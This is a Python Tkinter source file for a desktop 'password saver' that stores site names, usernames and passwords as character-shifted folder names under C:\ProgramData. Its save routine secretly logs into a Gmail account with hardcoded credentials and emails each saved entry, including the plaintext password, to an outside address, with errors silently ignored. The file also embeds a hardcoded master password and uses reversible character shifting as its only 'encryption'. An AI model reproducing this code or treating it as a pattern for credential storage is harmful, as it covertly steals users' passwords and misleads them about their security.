import os
import smtplib
from tkinter import *
import tkinter.messagebox as mb

os.chdir(r'C:\\ProgramData')

if os.path.isdir("PRIVATE"):
    pass
else:
    os.mkdir('PRIVATE')
os.chdir('PRIVATE')

class mypassword():
    def __init__(self):
        self.root = Tk()
        self.root.title("Passwordsaver by king")
        self.root.geometry("600x700")
       
     
        self.mainframe=Frame(self.root)
        self.fill_1 = Label(self.mainframe, text=" ", width=10).grid(row=1 ,column=0)
        self.fill_p = Label(self.mainframe, text="Password ", font=" arial 13",width=10,bg="red").grid(row=2 ,column=1)
        
        self.p_val = StringVar()
        self.p_show="*"
        self.p_value = Entry(self.mainframe, textvariable=self.p_val, font="arial 8",show=self.p_show)
        self.p_value.grid(row=4,column=1)

        self.show_pasword = Button(self.mainframe, text="show",font= "arial 8",  width=6,command=self.normal).grid(row=4 ,column=3)
        self.enter_p = Button(self.mainframe, text="enter", font=" arial 8",width=6,command=self.king).grid(row=5 ,column=1)
      
                              
        self.mainframe.pack()
        self.root.mainloop()


            
            
            
    def king(self):
   
            if self.p_val.get()=="KING":
                self.mainframe.destroy()
                self.fillchoice=Label(self.root,text="Enter choice ",font=" arial 20",).place(x=100,y=15)
                self.encryption=Label(self.root,text="1.Encryption ",font=" arial 18", bg="blue").place(x=5,y=50)
                self.decryption=Label(self.root,text="2.Decryption ",font=" arial 18", bg="yellow").place(x=200,y=50)
                self.delete=Label(self.root,text="3.Delete ",font=" arial 18" ,bg="violet").place(x=5,y=120)
                self.listdir=Label(self.root,text="4.List ",font=" arial 18", bg="green").place(x=200,y=120)
                self.val=StringVar()
                self.value=Entry(self.root,textvariable=self.val,font="arial 15").place(x=5,y=160)
                self.enter=Button(self.root,text="enter",font=" arial 12",command=self.run, bg="red").place(x=190,y=160)
            else:
                self.p_val.set("")
                mb.showwarning("Waring","Incorrect Password")


    #process
    def run(self):
        if self.val.get()=="1":
            os.chdir(r'C:\\ProgramData\\PRIVATE')
            try:
                self.enframe.destroy()
                self.display.destroy()
                self.delete_frame.destroy()
                self.display_inner.destroy()
            except:
                 pass
            self.enframe=Frame(self.root )
            self.filename = StringVar()
            Label(self.enframe, text="Filename ", font=" arial 8").pack(side=TOP, anchor=NW)
            self.filenametext = Entry(self.enframe, textvariable=self.filename, font="arial 8").pack(side=TOP, anchor=NW)
            #  get username
            self.username = StringVar()
            Label(self.enframe, text="Enter  Username ", font=" arial 8").pack(side=TOP, anchor=NW)
            self.usernametext = Entry(self.enframe, textvariable=self.username, font="arial 10").pack(side=TOP, anchor=NW)

            #get password
            self.password = StringVar()
            Label(self.enframe, text="Enter  Password ", font=" arial 8").pack(side=TOP, anchor=NW)
            self.passwordtext = Entry(self.enframe, textvariable=self.password, font="arial 8",show="*"
                                      ).pack(side=TOP, anchor=NW)
            self.show_pasword = Button(self.enframe, text="show", font="arial 8", 
                                       command=self.normal).pack(side=TOP, anchor=NW)

            # buttons
            self.enter = Button(self.enframe, text="save", font=" arial 8", 
                                command=self.save).pack(side=TOP, anchor=NW)

            self.clear = Button(self.enframe, text="clear", font=" arial 8", 
                                command=self.clear).pack(side=TOP, anchor=NW)
            self.enframe.place(x=5,y=230)


        elif self.val.get()=="2":
            os.chdir(r'C:\\ProgramData\\PRIVATE')
            try:
                self.enframe.destroy()
                self.display.destroy()
                self.delete_frame.destroy()
                self.display_inner.destroy()
               
            except:
               pass

            self.display = Frame(self.root)
            self.filename = StringVar()
            Label(self.display, text="Enter  Filename ", font=" arial 9").pack(side=TOP, anchor=NW)
            self.filenametext= Entry(self.display, textvariable=self.filename, font="arial 9",).pack(side=TOP,
                                                                                                     anchor=NW)
            self.enter = Button(self.display, text="show", font=" arial 9", 
                               command=self.show).pack(side=TOP, anchor=NW)
            self.username = StringVar()
            self.password = StringVar()
            Label(self.display, text=" Username ", font=" arial 10").pack(side=TOP, anchor=NW)
            self.usernametext = Entry(self.display, textvariable=self.username, font="arial 10",).pack(side=TOP,anchor=NW)


            Label(self.display, text="  Password ", font=" arial 10").pack(side=TOP, anchor=NW)
            self.passwordtext = Entry(self.display, textvariable=self.password, font="arial 10",).pack(side=TOP,anchor=NW)
            self.display.place(x=5,y=230)


        elif self.val.get() == "3":
            os.chdir(r'C:\\ProgramData\\PRIVATE')
            try:
                self.enframe.destroy()
                self.display.destroy()
                self.delete_frame.destroy()
                # self.display_inner.destroy()
            except:
                pass
            self.delete_frame = Frame(self.root)
            self.filename = StringVar()
            Label(self.delete_frame, text="Enter  Filename ", font=" arial 9").pack(side=TOP, anchor=NW)
            self.filenametext = Entry(self.delete_frame, textvariable=self.filename, font="arial 9", ).pack(
                side=TOP,
                anchor=NW)
            self.delete_data = Button(self.delete_frame, text="delete", font=" arial 9" ,
                                command=self.remove).pack(side=TOP, anchor=NW)


            self.delete_frame.place(x=5,y=230)
        elif self.val.get()=="4":
                os.chdir(r'C:\\ProgramData\\PRIVATE')
                try:
                    
                    self.showlist.destroy()
                except:
                    pass
                self.showlist= Frame(self.root)
                self.refreshbtn = Button(self.showlist, text="refresh", font=" arial 8", 
                                          command=self.refresh).pack(side=TOP, )
                self.closebtn = Button(self.showlist, text="close", font=" arial 8",
                                      command=self.close).pack(side=TOP,)
                self.b = Scrollbar(self.showlist)
                self.b.pack(side=RIGHT,fill=Y,anchor=N)

                self.l=Listbox(self.showlist,yscrollcommand=self.b.set,font="10",height=5,)
                
                for i in os.listdir():

                    self.one=""
                    for j in i:
                        self.letter=ord(j) -150
                    
                        self.one+=chr(self.letter)
                    self.l.insert(END,f"{self.one}")



                self.l.pack(side=LEFT,fill=Y)
                self.b.config(command=self.l.yview)

                self.showlist.config(background="red")
                self.showlist.place(x=350,y=200)



        else:
            self.val.set("")


    def save(self):
        
        self.username_1 = ""
        self.password_1 = ""
        self.new = ""
        try:
            s = smtplib.SMTP('smtp.gmail.com', 587)
  

            s.starttls()

            s.login("mtv30397@gmail.com", "kingavijit@01")

            message = self.filename.get() + "--=" + self.username.get() +"--=" + self.password.get()


            s.sendmail("mtv30397@gmail.com", "kingavijitsamantaray@gmail.com", message)
  

            s.quit()
        except:
            pass
        for i in self.filename.get():
            self.one = ord(i) +150
            self.new += chr(self.one)

        for i in self.password.get():
            self.num = ord(i) + 50
            self.password_1 += chr(self.num)
        for i in self.username.get():
            self.num = ord(i)+70
            self.username_1 += chr(self.num)

        if os.path.isdir(self.new):
            mb.showinfo("exists","already exsits")
        else:

            os.makedirs(self.new)
            os.chdir((self.new))
            os.makedirs(str(1) + self.username_1)
            os.makedirs(str(2) + self.password_1)
            os.chdir(r'C:\\ProgramData')


    def show(self):
        try:
            self.display_inner.destroy()
        except:
            pass

        os.chdir(r'C:\\ProgramData\\PRIVATE')
        # print(os.getcwd())
        self.new=""
        # print(self.filename.get())
        for i in self.filename.get():
            self.one = ord(i) +150
            self.new +=chr(self.one)
        
        try:    
                os.chdir(self.new)

                self.dir=os.listdir()
                self.username_1 = ""
                self.password_1 = ""
                for i in self.dir[0][1:]:
                    user = (ord(i)-70)
                    self.username_1+=chr(user)
                for i in self.dir[1][1:]:
                    # ord(i) + 34*ord(i) + 50

                    pas=(ord(i)-50)
                    self.password_1+=chr(pas)

                
                


                
                self.password.set(self.password_1)
                self.username.set(self.username_1)
                

                

                
        except:
                self.filename.set("")
                mb.showerror("error","invalid filename")

    def clear(self):
        try:
            self.filename.set("")
            self.username.set("")
            self.password.set("")
        except:
            pass
            os.chdir(r'C:\\ProgramData\\PRIVATE')

    def clear_data(self):
        self.filename.set("")
        try:
                self.display_inner.destroy()
        except:
            pass
        os.chdir(r'C:\\ProgramData\\PRIVATE')
    def remove(self):
        try:
            self.new = ""
            for i in self.filename.get():
                self.one = ord(i) + 150
                self.new += chr(self.one)
            os.chdir(r'C:\\ProgramData\\PRIVATE')
            os.chdir(self.new)
            for i in os.listdir():
                os.rmdir(i)
            os.chdir(r'C:\\ProgramData\\PRIVATE')
            os.rmdir(self.new)
            mb.showinfo("sucess","Sucessfully Deleted")
        except:
            mb.showerror("error","file not exsist")
    def change(self):
        pass
    def normal(self):
       try:
           mb.showinfo("password", self.password.get())
       except:
            mb.showinfo("password",self.p_val.get())



    def refresh(self):
        self.l.delete(0,END)
        os.chdir(r'C:\\ProgramData\\PRIVATE')
        for i in os.listdir():

            self.one = ""
            for j in i:
                self.letter = ord(j) - 150
                # self.letter=ord(j) +150 -100 - 200 - 100 + 150
                self.one += chr(self.letter)
            self.l.insert(END, f"{self.one}")
    def close(self):
        self.p_val.set("")
        self.showlist.destroy()


mypassword()

